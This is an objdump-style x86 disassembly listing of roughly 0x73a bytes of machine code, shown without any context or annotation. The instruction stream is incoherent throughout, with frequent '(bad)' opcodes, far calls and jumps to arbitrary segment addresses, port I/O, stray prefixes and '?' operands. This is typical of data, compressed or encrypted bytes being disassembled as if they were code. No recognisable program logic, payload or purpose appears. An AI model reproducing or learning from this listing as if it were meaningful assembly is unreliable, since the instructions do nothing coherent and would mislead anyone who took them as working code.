  41e9eb:	lods   eax,DWORD PTR ds:[esi]
  41e9ec:	and    BYTE PTR [edx],dh
  41e9ee:	cmp    BYTE PTR [edx-0x2a],0x12
  41e9f2:	(bad)  
  41e9f3:	fucom  st(2)
  41e9f5:	mov    bh,BYTE PTR [ecx]
  41e9f7:	lock les edi,FWORD PTR [edx]
  41e9fa:	stc    
  41e9fb:	or     bl,BYTE PTR [edx+0x50c6f06d]
  41ea01:	push   ebp
  41ea02:	add    al,0x28
  41ea04:	ins    BYTE PTR es:[edi],dx
  41ea05:	cmc    
  41ea06:	xchg   edi,eax
  41ea07:	mov    bh,0xf7
  41ea09:	ror    ah,0x3e
  41ea0c:	lods   eax,DWORD PTR ds:[esi]
  41ea0d:	stos   BYTE PTR es:[edi],al
  41ea0e:	mov    cl,0xd8
  41ea10:	xchg   edi,eax
  41ea11:	inc    edi
  41ea12:	pop    esp
  41ea13:	adc    edi,esp
  41ea15:	in     eax,0x44
  41ea17:	push   ecx
  41ea18:	rol    BYTE PTR [edx+0x61d00092],1
  41ea1e:	mov    WORD PTR [ebp-0x62],es
  41ea21:	push   0x30296dd
  41ea26:	repz mov ebp,0x5d7fa9ac
  41ea2c:	cmp    eax,0xe6ac08c4
  41ea31:	cmp    ch,BYTE PTR [ecx+0x10]
  41ea34:	jnp    0x41ea6a
  41ea36:	es (bad) 
  41ea38:	jl     0x41ea0c
  41ea3a:	mov    dh,al
  41ea3c:	test   eax,0xcd822ed9
  41ea41:	inc    edx
  41ea42:	jae    0x41e9c9
  41ea44:	fcom   DWORD PTR [edi]
  41ea46:	mov    ch,0xa6
  41ea48:	call   0x5a4c:0xc392aec7
  41ea4f:	jbe    0x41ea98
  41ea51:	lock add eax,0x9b1e05cd
  41ea57:	jge    0x41eab1
  41ea59:	stos   DWORD PTR es:[edi],eax
  41ea5a:	imul   esi,DWORD PTR [esi],0xd0d8f394
  41ea60:	xchg   esp,eax
  41ea61:	add    ch,BYTE PTR [esi-0x44]
  41ea64:	retf   0x61a
  41ea67:	(bad)  
  41ea68:	push   ebp
  41ea69:	mov    bl,0x1f
  41ea6b:	addr16 aam 0x7b
  41ea6e:	nop    DWORD PTR [edi]
  41ea71:	lods   al,BYTE PTR ds:[esi]
  41ea72:	xchg   BYTE PTR [ebp-0x65],dl
  41ea75:	sbb    edi,DWORD PTR [eax-0x4e]
  41ea78:	sar    DWORD PTR ds:0xbe8e5757,1
  41ea7e:	mov    bh,0xb6
  41ea80:	pushf  
  41ea81:	sub    ebx,DWORD PTR [eax+0x4a]
  41ea84:	mov    ds:0x59c8ea57,al
  41ea89:	(bad)  
  41ea8a:	pop    ebx
  41ea8b:	rol    BYTE PTR [edi+0x218ae495],1
  41ea91:	loope  0x41ea78
  41ea93:	push   ebx
  41ea94:	jnp    0x41eb00
  41ea96:	add    BYTE PTR [ecx],0x65
  41ea99:	fiadd  DWORD PTR [edi-0xa6d5497]
  41ea9f:	cli    
  41eaa0:	cli    
  41eaa1:	dec    ebx
  41eaa2:	fscale 
  41eaa4:	in     eax,0xe0
  41eaa6:	xchg   edx,eax
  41eaa7:	(bad)  
  41eaa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaa9:	imul   esp,DWORD PTR [eax+0x65],0x1a9f21f5
  41eab0:	bound  esi,QWORD PTR ds:0x9b7f277a
  41eab6:	call   0x4379:0x9ef656c7
  41eabd:	push   ebp
  41eabe:	push   ecx
  41eabf:	test   ecx,edx
  41eac1:	out    dx,al
  41eac2:	sub    ebp,edi
  41eac4:	jecxz  0x41ea8f
  41eac6:	fucom  st(5)
  41eac8:	call   0xad55fd84
  41eacd:	xor    DWORD PTR [ecx+0x57c329ef],esi
  41ead3:	mov    eax,ds:0x9e9b6f6b
  41ead8:	adc    al,0xfa
  41eada:	jne    0x41eac8
  41eadc:	out    0x12,eax
  41eade:	add    DWORD PTR [esi],esp
  41eae0:	int    0x94
  41eae2:	(bad)  
  41eae3:	or     al,BYTE PTR ss:[ecx]
  41eae6:	gs jo  0x41ea85
  41eae9:	mov    ecx,0x947cbdc9
  41eaee:	aas    
  41eaef:	and    BYTE PTR [esi-0x80],ah
  41eaf2:	popa   
  41eaf3:	mov    esi,0xbbd334c8
  41eaf8:	mov    dl,0x87
  41eafa:	jae    0x41eb29
  41eafc:	popf   
  41eafd:	lock jle 0x41eb28
  41eb00:	mov    ecx,0xcc47667d
  41eb05:	dec    edi
  41eb06:	push   eax
  41eb07:	fiadd  DWORD PTR [ecx+0x27]
  41eb0a:	push   esi
  41eb0b:	addr16 gs in eax,0x45
  41eb0f:	dec    ebx
  41eb10:	sub    BYTE PTR [edx-0x2fda1556],bh
  41eb16:	stc    
  41eb17:	sti    
  41eb18:	(bad)  
  41eb19:	and    DWORD PTR [edi+0xf08d2f9],eax
  41eb1f:	sbb    al,0xd1
  41eb21:	out    0x6,eax
  41eb23:	sbb    DWORD PTR [esi],edi
  41eb25:	repz fbld TBYTE PTR [ebp-0x5c]
  41eb29:	cmp    ch,ah
  41eb2b:	outs   dx,DWORD PTR ds:[esi]
  41eb2c:	rcr    dl,0x56
  41eb2f:	imul   esi,DWORD PTR [esi+0x7eb4adb0],0x440492aa
  41eb39:	mov    ch,BYTE PTR ds:0x4d4566c4
  41eb3f:	outs   dx,BYTE PTR ds:[esi]
  41eb40:	cmp    ch,cl
  41eb42:	ss loope 0x41eb04
  41eb45:	push   es
  41eb46:	and    eax,0x336d58a8
  41eb4b:	js     0x41eb4a
  41eb4d:	cmp    bl,ah
  41eb4f:	push   ss
  41eb50:	adc    esp,DWORD PTR [ebp-0x70]
  41eb53:	mov    ds,ebx
  41eb55:	outs   dx,BYTE PTR ds:[esi]
  41eb56:	outs   dx,BYTE PTR ds:[esi]
  41eb57:	add    DWORD PTR [eax],0x42
  41eb5a:	sbb    ecx,DWORD PTR [ecx+0x55]
  41eb5d:	adc    ah,BYTE PTR [ebx-0xa49b6b5]
  41eb63:	aas    
  41eb64:	out    dx,eax
  41eb65:	in     al,dx
  41eb66:	jns    0x41eb3e
  41eb68:	sbb    ebx,esi
  41eb6a:	sbb    esp,DWORD PTR [edi]
  41eb6c:	inc    edx
  41eb6d:	pop    ebp
  41eb6e:	test   al,0x8f
  41eb70:	stos   DWORD PTR es:[edi],eax
  41eb71:	stos   BYTE PTR es:[edi],al
  41eb72:	push   ebx
  41eb73:	(bad)  
  41eb74:	push   edi
  41eb75:	(bad)  
  41eb76:	out    dx,eax
  41eb77:	add    DWORD PTR [ebp+eax*2+0x2d2b1bfe],edx
  41eb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb7f:	xor    DWORD PTR [ebx],esi
  41eb81:	mov    bh,0x6e
  41eb83:	xor    DWORD PTR [ebx-0x2d],0xffffffca
  41eb87:	fidiv  DWORD PTR [edx+0xd]
  41eb8a:	ret    0xdb99
  41eb8d:	ror    BYTE PTR [edx-0x75c255f4],0xa5
  41eb94:	inc    edi
  41eb95:	(bad)  [edi-0x52]
  41eb98:	and    ebp,ebx
  41eb9a:	loop   0x41ebc4
  41eb9c:	shr    DWORD PTR [esi],cl
  41eb9e:	ror    ch,cl
  41eba0:	aam    0xe0
  41eba2:	dec    eax
  41eba3:	push   0x23
  41eba5:	sub    eax,DWORD PTR [ecx+eiz*1+0xf]
  41eba9:	xlat   BYTE PTR ds:[ebx]
  41ebaa:	scas   eax,DWORD PTR es:[edi]
  41ebab:	pusha  
  41ebac:	fld    DWORD PTR [esi+0x50eb98ba]
  41ebb2:	sbb    eax,0x8f1fa097
  41ebb7:	or     al,0x29
  41ebb9:	in     al,dx
  41ebba:	pusha  
  41ebbb:	jno    0x41eb97
  41ebbd:	xchg   ebp,eax
  41ebbe:	xchg   esi,eax
  41ebbf:	sbb    DWORD PTR [ecx],ecx
  41ebc1:	hlt    
  41ebc2:	mov    BYTE PTR [edx-0x262adbef],ah
  41ebc8:	test   al,0xa2
  41ebca:	cmp    esp,DWORD PTR [eax]
  41ebcc:	jmp    DWORD PTR [esi+0x43]
  41ebcf:	jl     0x41ec27
  41ebd1:	push   ecx
  41ebd2:	add    al,0x78
  41ebd4:	xor    ch,ch
  41ebd6:	outs   dx,DWORD PTR ds:[esi]
  41ebd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebd8:	call   0x329e:0xeaea2e5c
  41ebdf:	into   
  41ebe0:	pop    ds
  41ebe1:	and    dh,dh
  41ebe3:	pop    esi
  41ebe4:	fwait
  41ebe5:	pop    ebx
  41ebe6:	cld    
  41ebe7:	or     eax,0xd5033600
  41ebec:	jecxz  0x41eb8d
  41ebee:	sti    
  41ebef:	inc    ecx
  41ebf0:	aas    
  41ebf1:	repnz or BYTE PTR [ebp+0x4],cl
  41ebf5:	push   0xffffffa5
  41ebf7:	js     0x41ec70
  41ebf9:	push   es
  41ebfa:	dec    ecx
  41ebfb:	mov    ds:0x6a215391,eax
  41ec00:	xor    eax,DWORD PTR [ebx+0x17]
  41ec03:	cmp    eax,0x799481a0
  41ec08:	mov    ch,0x62
  41ec0a:	xchg   esi,eax
  41ec0b:	gs ds push ebp
  41ec0e:	cmp    DWORD PTR [ebx+0x18ac3091],esp
  41ec14:	fdivp  st(4),st
  41ec16:	pop    esi
  41ec17:	in     al,dx
  41ec18:	scas   eax,DWORD PTR es:[edi]
  41ec19:	call   0x3857:0xe02b1346
  41ec20:	cmp    DWORD PTR [ebp+0x68fdcb68],0x3
  41ec27:	(bad)  
  41ec28:	fisubr DWORD PTR [esi]
  41ec2a:	fld    TBYTE PTR [ebx-0x57]
  41ec2d:	sub    al,0xdf
  41ec2f:	xlat   BYTE PTR ds:[ebx]
  41ec30:	shl    dl,cl
  41ec32:	xor    al,0x9b
  41ec34:	fmul   st,st(2)
  41ec36:	xor    ecx,DWORD PTR [edi+0x2baa7849]
  41ec3c:	loope  0x41ec2d
  41ec3e:	jmp    0x837ff4c3
  41ec43:	es int 0xcc
  41ec46:	aad    0xd1
  41ec48:	test   al,0x16
  41ec4a:	jecxz  0x41ec37
  41ec4c:	mov    bl,0x45
  41ec4e:	adc    edi,ebx
  41ec50:	pop    ds
  41ec51:	gs lock jg 0x41ecb7
  41ec55:	js     0x41ec18
  41ec57:	xchg   ebx,eax
  41ec58:	mov    ebx,0x66cf29d
  41ec5d:	mov    ah,0xd2
  41ec5f:	jo     0x41ec7f
  41ec61:	in     al,0x9b
  41ec63:	imul   ebp,DWORD PTR [edx],0xd
  41ec66:	push   eax
  41ec67:	in     eax,0xdf
  41ec69:	cli    
  41ec6a:	out    dx,eax
  41ec6b:	aam    0x5e
  41ec6d:	pushf  
  41ec6e:	adc    DWORD PTR [ebx+ecx*2-0x3f],0x8fea3db2
  41ec76:	push   0xee97f8b7
  41ec7b:	pop    ecx
  41ec7c:	fisubr WORD PTR [esi]
  41ec7e:	call   0x9add3efc
  41ec83:	pop    es
  41ec84:	xchg   DWORD PTR es:[ebx-0x43],ecx
  41ec88:	mov    al,ds:0xecf79758
  41ec8d:	pop    ebp
  41ec8e:	cmp    dl,ch
  41ec90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec91:	scas   eax,DWORD PTR es:[edi]
  41ec92:	in     al,dx
  41ec93:	leave  
  41ec94:	shr    BYTE PTR [eax+0x67],cl
  41ec97:	mov    bh,0xd7
  41ec99:	push   edx
  41ec9a:	push   edx
  41ec9b:	xchg   esp,eax
  41ec9c:	push   ds
  41ec9d:	mov    edi,0x623f259a
  41eca2:	test   eax,0x6bfba951
  41eca7:	iret   
  41eca8:	icebp  
  41eca9:	or     eax,0x40e58662
  41ecae:	cld    
  41ecaf:	fwait
  41ecb0:	retf   
  41ecb1:	mov    cl,0x2f
  41ecb3:	pushf  
  41ecb4:	into   
  41ecb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecb6:	je     0x41ec49
  41ecb8:	inc    ebx
  41ecb9:	mov    ss,WORD PTR [edx-0x74]
  41ecbc:	mov    DWORD PTR [edi+0x30],eax
  41ecbf:	mov    dx,0x9f6f
  41ecc3:	xor    al,0xfe
  41ecc5:	dec    ecx
  41ecc6:	into   
  41ecc7:	or     al,0x2b
  41ecc9:	or     eax,0xbb7c6e92
  41ecce:	cmp    BYTE PTR [eax-0x24],bl
  41ecd1:	test   BYTE PTR [ecx+0x316e0a7d],dl
  41ecd7:	dec    esi
  41ecd8:	xor    BYTE PTR [eax-0x643b9414],dl
  41ecde:	nop
  41ecdf:	pop    es
  41ece0:	pop    ecx
  41ece1:	inc    ecx
  41ece2:	es lock lock daa 
  41ece6:	push   ecx
  41ece7:	pop    es
  41ece8:	or     BYTE PTR [ecx],ch
  41ecea:	(bad)  
  41eceb:	inc    esp
  41ecec:	adc    DWORD PTR [ecx],edi
  41ecee:	xor    DWORD PTR [eax],eax
  41ecf0:	inc    ebx
  41ecf1:	loop   0x41ece7
  41ecf3:	push   edi
  41ecf4:	push   eax
  41ecf5:	nop
  41ecf6:	outs   dx,BYTE PTR ds:[esi]
  41ecf7:	sbb    al,0xbe
  41ecf9:	cli    
  41ecfa:	inc    esi
  41ecfb:	add    al,0xc5
  41ecfd:	(bad)  
  41ecfe:	scas   al,BYTE PTR es:[edi]
  41ecff:	(bad)  
  41ed01:	inc    eax
  41ed02:	xor    al,0xbc
  41ed04:	inc    ecx
  41ed05:	mov    al,0x8
  41ed07:	xchg   ecx,eax
  41ed08:	jg     0x41ed3a
  41ed0a:	adc    ah,al
  41ed0c:	pop    ss
  41ed0d:	aad    0x18
  41ed0f:	or     al,0xdd
  41ed11:	mov    ebx,0xe41401eb
  41ed16:	hlt    
  41ed17:	and    al,0xcd
  41ed19:	fst    DWORD PTR [edi]
  41ed1b:	pop    ds
  41ed1c:	or     eax,0x9063e784
  41ed21:	lods   al,BYTE PTR ds:[esi]
  41ed22:	cmp    BYTE PTR [eax+edx*4+0x17],ch
  41ed26:	add    ch,BYTE PTR [ecx+0x17f6eaa9]
  41ed2c:	mov    ebp,0xc7080192
  41ed31:	test   BYTE PTR [ecx-0x4358bd52],al
  41ed37:	and    al,0xea
  41ed39:	sub    eax,0xe3f018e8
  41ed3e:	mov    esp,0xcefba795
  41ed43:	out    dx,eax
  41ed44:	pusha  
  41ed45:	sar    DWORD PTR [ebx+edx*8],0x1c
  41ed49:	xlat   BYTE PTR ds:[ebx]
  41ed4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed4b:	jae    0x41ed86
  41ed4d:	mov    eax,0xd59f4083
  41ed52:	dec    edi
  41ed53:	jl     0x41edad
  41ed55:	cwde   
  41ed56:	xor    DWORD PTR [eax-0x3dc304af],ebx
  41ed5c:	ret    0x43f0
  41ed5f:	mov    edx,fs
  41ed61:	xchg   ecx,eax
  41ed62:	fild   WORD PTR [ebp-0x7420d3e2]
  41ed68:	push   ebx
  41ed69:	popf   
  41ed6a:	push   edx
  41ed6b:	loope  0x41ed3c
  41ed6d:	sub    ebp,DWORD PTR [ebx+ecx*8-0x10]
  41ed71:	xor    bh,bl
  41ed73:	dec    esp
  41ed74:	sub    edx,DWORD PTR [eax+0x7e26af47]
  41ed7a:	aad    0xaf
  41ed7c:	sbb    bh,BYTE PTR [ebx]
  41ed7e:	xor    eax,0x7b13be2f
  41ed83:	add    BYTE PTR [edx],bh
  41ed85:	loopne 0x41edcf
  41ed87:	fcmovnu st,st(3)
  41ed89:	xchg   DWORD PTR [eax+0x6d4a3afa],edx
  41ed8f:	out    0xcf,al
  41ed91:	mov    ebx,0xb9472ff5
  41ed96:	mov    ds:0x318f0943,eax
  41ed9b:	ds dec esp
  41ed9d:	ja     0x41ee16
  41ed9f:	and    eax,DWORD PTR [edx-0xb]
  41eda2:	or     eax,0x66284424
  41eda7:	sar    DWORD PTR [ebx-0x36b4671f],cl
  41edad:	cmp    DWORD PTR [esi-0x24],edi
  41edb0:	dec    edi
  41edb1:	mov    BYTE PTR [ecx+0x49cae194],bl
  41edb7:	lods   eax,DWORD PTR ds:[esi]
  41edb8:	jmp    0x41ed63
  41edba:	push   0x41
  41edbc:	push   edi
  41edbd:	add    al,dl
  41edbf:	test   al,0x26
  41edc1:	push   es
  41edc2:	lahf   
  41edc3:	stos   DWORD PTR es:[edi],eax
  41edc4:	(bad)  
  41edc5:	fs mov ebx,0x9a26c5f1
  41edcb:	daa    
  41edcc:	mov    WORD PTR [eax-0x2c],ds
  41edcf:	push   eax
  41edd0:	fmul   QWORD PTR ds:0x26b75fd7
  41edd6:	rcl    DWORD PTR ds:0x7893d0d0,1
  41eddc:	cdq    
  41eddd:	ja     0x41edaf
  41eddf:	aad    0x74
  41ede1:	stos   DWORD PTR es:[edi],eax
  41ede2:	sti    
  41ede3:	clc    
  41ede4:	mul    bl
  41ede6:	mov    al,ds:0xe1a7a88c
  41edeb:	lock dec ebp
  41eded:	in     al,dx
  41edee:	push   eax
  41edef:	mov    ds:0xf7d3501,al
  41edf4:	sbb    al,0xad
  41edf6:	fcom   DWORD PTR [edx-0x4c]
  41edf9:	dec    esi
  41edfa:	push   esp
  41edfb:	cmp    BYTE PTR [ebp-0x49],dl
  41edfe:	xor    DWORD PTR [ecx-0x52],0xd077cf54
  41ee05:	pop    es
  41ee06:	retf   0xb0a3
  41ee09:	add    BYTE PTR [ecx+ebp*8+0x60],cl
  41ee0d:	add    BYTE PTR [eax],al
  41ee0f:	add    BYTE PTR [eax],al
  41ee11:	add    BYTE PTR [edx+0x51],dl
  41ee14:	cmp    BYTE PTR [ebx],al
  41ee16:	cmp    ebp,DWORD PTR [ebx+0x7b]
  41ee19:	push   ecx
  41ee1a:	pop    edx
  41ee1b:	mov    ch,0xf5
  41ee1d:	lahf   
  41ee1e:	test   DWORD PTR [ebx+0x68f344e7],0x4f30001
  41ee28:	add    BYTE PTR [eax],al
  41ee2a:	adc    DWORD PTR [ecx-0x7b],eax
  41ee2d:	cwde   
  41ee2e:	test   BYTE PTR [esi],bl
  41ee30:	and    eax,0xf961b5f2
  41ee35:	fsubr  QWORD PTR [esi+0x7c858a]
  41ee3b:	mov    cl,0xa8
  41ee3d:	and    bl,BYTE PTR ds:0x9f4ff72f
  41ee43:	test   eax,0x9d4a2b45
  41ee48:	fwait
  41ee49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee4a:	into   
  41ee4b:	sub    BYTE PTR [esi+0x3556f0d3],dh
  41ee51:	adc    ecx,edi
  41ee53:	adc    esi,DWORD PTR [ebx-0x6f]
  41ee56:	push   edx
  41ee57:	in     eax,dx
  41ee58:	in     eax,dx
  41ee59:	out    0x6a,al
  41ee5b:	popf   
  41ee5c:	adc    esi,ebx
  41ee5e:	sbb    ebp,ebp
  41ee60:	ins    DWORD PTR es:[edi],dx
  41ee61:	pop    edi
  41ee62:	int3   
  41ee63:	mov    BYTE PTR ds:0xfd3ebe78,ah
  41ee69:	(bad)
  41ee6c:	mov    edx,0x7f8f2c8
  41ee71:	imul   esi,DWORD PTR [ebp-0x18],0xffffffa5
  41ee75:	pop    ebp
  41ee76:	dec    eax
  41ee77:	and    dh,ah
  41ee79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee7a:	adc    cl,bh
  41ee7c:	scas   al,BYTE PTR es:[edi]
  41ee7d:	jae    0x41eeb1
  41ee7f:	mov    ds:0xa1435f9e,al
  41ee84:	xchg   DWORD PTR [edx+edx*2],ecx
  41ee87:	in     eax,dx
  41ee88:	add    al,dh
  41ee8a:	test   al,0xfe
  41ee8c:	test   BYTE PTR [edi+0x12240acc],dl
  41ee92:	inc    edx
  41ee93:	cld    
  41ee94:	bound  ecx,QWORD PTR [edx]
  41ee96:	push   0xffffffc7
  41ee98:	test   DWORD PTR ds:0x86d549da,edx
  41ee9e:	mov    ebp,0x55eea513
  41eea3:	lods   eax,DWORD PTR ds:[esi]
  41eea4:	push   ebx
  41eea5:	mov    al,0x38
  41eea7:	xchg   edi,eax
  41eea8:	pushf  
  41eea9:	xor    esi,edx
  41eeab:	out    dx,eax
  41eeac:	idiv   DWORD PTR [eax-0x72]
  41eeaf:	mov    edi,DWORD PTR [esi+0x7154b38c]
  41eeb5:	mov    ch,0x73
  41eeb7:	bound  ebx,QWORD PTR [edx]
  41eeb9:	jae    0x41eec4
  41eebb:	mov    esp,0x13602954
  41eec0:	jae    0x41ef34
  41eec2:	inc    eax
  41eec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec4:	lock sti 
  41eec6:	mov    bl,0xcc
  41eec8:	push   esi
  41eec9:	je     0x41ef32
  41eecb:	repz xchg ebp,eax
  41eecd:	jmp    0x41ee69
  41eecf:	imul   edx,DWORD PTR [ecx-0x48b39338],0x0
  41eed6:	add    dl,0x63
  41eed9:	mov    al,ds:0xf46763ee
  41eede:	popf   
  41eedf:	mov    eax,0xc8212b30
  41eee4:	ffree  st(5)
  41eee6:	icebp  
  41eee7:	fwait
  41eee8:	push   0x60
  41eeea:	xchg   DWORD PTR [edi+esi*1],esp
  41eeed:	dec    edi
  41eeee:	cmp    ebx,esp
  41eef0:	inc    ebx
  41eef1:	xor    ebp,DWORD PTR [edi+0x7a7625b2]
  41eef7:	xor    eax,0x1f4bc5ab
  41eefc:	pop    edx
  41eefd:	repnz scas al,BYTE PTR es:[edi]
  41eeff:	or     eax,0xec370f30
  41ef04:	loope  0x41ee9a
  41ef06:	sahf   
  41ef07:	iret   
  41ef08:	icebp  
  41ef09:	in     al,dx
  41ef0a:	adc    edx,DWORD PTR [ecx]
  41ef0c:	sub    BYTE PTR [ecx+0x53],dl
  41ef0f:	add    edi,DWORD PTR [ebx+eiz*1+0x28]
  41ef13:	jb     0x41ef0d
  41ef15:	and    eax,0x46234069
  41ef1a:	aad    0xbd
  41ef1c:	je     0x41eef4
  41ef1e:	sub    BYTE PTR [edx+0x60f2ef0c],ch
  41ef24:	sbb    cl,BYTE PTR [ebp+0x6d55ef99]
  41ef2a:	daa    
  41ef2b:	mov    ebp,0x3ec3c130
  41ef30:	lods   eax,DWORD PTR ds:[esi]
  41ef31:	adc    al,dl
  41ef33:	sub    al,0xb5
  41ef35:	push   ebx
  41ef36:	or     DWORD PTR [ebx],esp
  41ef38:	rcl    DWORD PTR [esp+edi*2],1
  41ef3b:	ins    BYTE PTR es:[edi],dx
  41ef3c:	(bad)  
  41ef3d:	nop
  41ef3e:	cmp    al,0x7f
  41ef40:	ret    
  41ef41:	xor    esi,ebx
  41ef43:	jge    0x41eef6
  41ef45:	shr    edx,0x9
  41ef48:	pop    es
  41ef49:	loop   0x41efbd
  41ef4b:	(bad)  
  41ef4c:	jnp    0x41eefb
  41ef4e:	xchg   esi,eax
  41ef4f:	int    0x2f
  41ef51:	sub    al,BYTE PTR [edx-0x19]
  41ef54:	or     edi,DWORD PTR [ebx]
  41ef56:	mov    BYTE PTR [esi-0x19d3a090],bh
  41ef5c:	stos   BYTE PTR es:[edi],al
  41ef5d:	push   esi
  41ef5e:	retf   
  41ef5f:	rcr    DWORD PTR ds:0x2599c000,0x7c
  41ef66:	cmp    dh,BYTE PTR [ebx-0x7a]
  41ef69:	jbe    0x41efa3
  41ef6b:	mov    ecx,0x8f6f5786
  41ef70:	cs add eax,0x6c6d9a4b
  41ef76:	and    DWORD PTR [esi+0x52],eax
  41ef79:	iret   
  41ef7a:	fwait
  41ef7b:	jp     0x41ef16
  41ef7d:	and    dl,BYTE PTR [edi-0x4]
  41ef80:	mov    bl,0xae
  41ef82:	idiv   DWORD PTR [ebp-0x35482926]
  41ef88:	mov    cl,0x70
  41ef8a:	xchg   edi,eax
  41ef8b:	out    dx,al
  41ef8c:	cmp    BYTE PTR [eax+0x54],bh
  41ef8f:	push   ds
  41ef90:	jmp    DWORD PTR [eax]
  41ef92:	jno    0x41efa0
  41ef94:	xchg   edi,eax
  41ef95:	int3   
  41ef96:	and    eax,0x819b3531
  41ef9b:	xchg   sp,ax
  41ef9d:	push   ds
  41ef9e:	lds    edi,FWORD PTR [ecx+eax*1-0x488c6171]
  41efa5:	adc    ecx,edx
  41efa7:	add    eax,0xb9982e1c
  41efac:	scas   al,BYTE PTR es:[edi]
  41efad:	jecxz  0x41efea
  41efaf:	fild   DWORD PTR [edx+ebx*4+0x6ca837d0]
  41efb6:	or     esp,0x38
  41efb9:	mov    edx,0xda4ddcfc
  41efbe:	xor    al,0x4b
  41efc0:	mov    edx,0xa9f94ad9
  41efc5:	or     al,0x59
  41efc7:	into   
  41efc8:	fimul  WORD PTR [ebx]
  41efca:	sub    DWORD PTR [ebp+0x7c4ec564],edx
  41efd0:	or     eax,0x2aeb9e56
  41efd5:	(bad)  [ecx]
  41efd7:	jne    0x41f01d
  41efd9:	mov    eax,0x13b0236c
  41efde:	fst    DWORD PTR [edi]
  41efe0:	div    cl
  41efe2:	aad    0xe0
  41efe4:	sub    al,ah
  41efe6:	in     al,dx
  41efe7:	lds    esp,FWORD PTR [ebx+0x8]
  41efea:	fcomp  DWORD PTR [edx-0x267b54f0]
  41eff0:	inc    edi
  41eff1:	je     0x41ef8e
  41eff3:	xor    al,0x2a
  41eff5:	rol    DWORD PTR [esi+0x863989d],cl
  41effb:	mov    bl,0xca
  41effd:	pop    ebx
  41effe:	enter  0xef25,0x19
  41f002:	pushf  
  41f003:	test   al,0xf1
  41f005:	xor    eax,0xdbb86cec
  41f00a:	jno    0x41f069
  41f00c:	ja     0x41f064
  41f00e:	cmp    eax,0x43b3930b
  41f013:	push   cs
  41f014:	push   edi
  41f015:	xor    eax,ebx
  41f017:	ss mov edi,0xa55c9279
  41f01d:	mov    edi,0x2e37287
  41f022:	mov    esi,0xba8cea8a
  41f027:	stos   BYTE PTR es:[edi],al
  41f028:	imul   eax,DWORD PTR [ebx+ecx*1-0x7aac3694],0x34
  41f030:	(bad)  
  41f031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f032:	out    0x8f,eax
  41f034:	ror    BYTE PTR [esi-0x559936cb],0x96
  41f03b:	cwde   
  41f03c:	jb     0x41efd1
  41f03e:	in     al,0x47
  41f040:	lock fbstp TBYTE PTR [edi]
  41f043:	shl    dl,1
  41f045:	mov    esp,0x5109c3f9
  41f04a:	sahf   
  41f04b:	pop    ss
  41f04c:	(bad)  
  41f04d:	outs   dx,BYTE PTR ds:[esi]
  41f04e:	jno    0x41f028
  41f050:	sbb    DWORD PTR [ebp+0x760c0c6],eax
  41f056:	cmp    BYTE PTR [edx],al
  41f058:	ja     0x41f0bd
  41f05a:	pop    eax
  41f05b:	jl     0x41f01f
  41f05d:	mov    esp,0x2a881a41
  41f062:	in     al,dx
  41f063:	push   ebx
  41f064:	jo     0x41f0ae
  41f066:	sbb    dh,BYTE PTR [edi+0x1d9d276c]
  41f06c:	mov    dl,0xa3
  41f06e:	jo     0x41f092
  41f070:	shl    BYTE PTR [esi-0x3340eb46],cl
  41f076:	repnz or esi,DWORD PTR [ebp-0x5b]
  41f07a:	pop    ecx
  41f07b:	pushf  
  41f07c:	repnz aas 
  41f07e:	cld    
  41f07f:	fs push edi
  41f081:	(bad)  
  41f082:	adc    bh,ch
  41f084:	sar    DWORD PTR [ebx-0x3a],0x44
  41f088:	pop    ss
  41f089:	pop    ss
  41f08a:	mov    dh,0x94
  41f08c:	push   edi
  41f08d:	iret   
  41f08e:	mov    bl,dl
  41f090:	retf   
  41f091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f092:	or     BYTE PTR [ecx+0xe1a9759],dh
  41f098:	xadd   DWORD PTR [eax],edx
  41f09b:	mov    edi,0xe82b007f
  41f0a0:	sbb    BYTE PTR [eax+ebx*4-0x11],cl
  41f0a4:	pop    ebp
  41f0a5:	aad    0x27
  41f0a7:	dec    esi
  41f0a8:	out    0xe1,al
  41f0aa:	outs   dx,DWORD PTR ds:[esi]
  41f0ab:	xchg   DWORD PTR [ebp-0x42],edx
  41f0ae:	add    al,0x99
  41f0b0:	add    DWORD PTR [edx+0x17],esp
  41f0b3:	dec    esi
  41f0b5:	push   esi
  41f0b6:	cdq    
  41f0b7:	idiv   edi
  41f0b9:	sbb    al,0xce
  41f0bb:	test   DWORD PTR [eax],0x13698fde
  41f0c1:	dec    edx
  41f0c2:	lea    esi,[edi+edx*4-0x515e84d3]
  41f0c9:	sbb    bh,BYTE PTR [edi]
  41f0cb:	inc    eax
  41f0cc:	dec    edi
  41f0cd:	rcr    DWORD PTR [ebx-0x6a],1
  41f0d0:	mov    WORD PTR [edx-0x6f],?
  41f0d3:	push   DWORD PTR [edx]
  41f0d5:	fmulp  st(3),st
  41f0d7:	outs   dx,DWORD PTR ds:[esi]
  41f0d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d9:	xchg   bl,bl
  41f0db:	push   edx
  41f0dc:	clc    
  41f0dd:	add    DWORD PTR [edi-0x3b],0x636408d0
  41f0e4:	push   ecx
  41f0e5:	clc    
  41f0e6:	sub    DWORD PTR [ecx+ebx*1+0x43e20b33],ecx
  41f0ed:	mov    al,BYTE PTR [edx+ebx*2+0x56]
  41f0f1:	xchg   edx,eax
  41f0f2:	push   edx
  41f0f3:	sbb    cl,dl
  41f0f5:	mov    dl,BYTE PTR [edi]
  41f0f7:	sbb    BYTE PTR [edi+eax*8+0x7f42ce13],bl
  41f0fe:	aad    0xfb
  41f100:	inc    edx
  41f101:	jmp    0xc756:0xdc7428a9
  41f108:	cmp    al,0xad
  41f10a:	ret    
  41f10b:	cld    
  41f10c:	adc    eax,0x712a2595
  41f111:	adc    esp,DWORD PTR [edi]
  41f113:	mov    ebp,0xd834c4ee
  41f118:	aas    
  41f119:	call   0x92f5:0xbcb6bc8b
  41f120:	mov    ebp,0x3cbf0ac9
  41f125:	mov    WORD PTR [eax+0x17],?
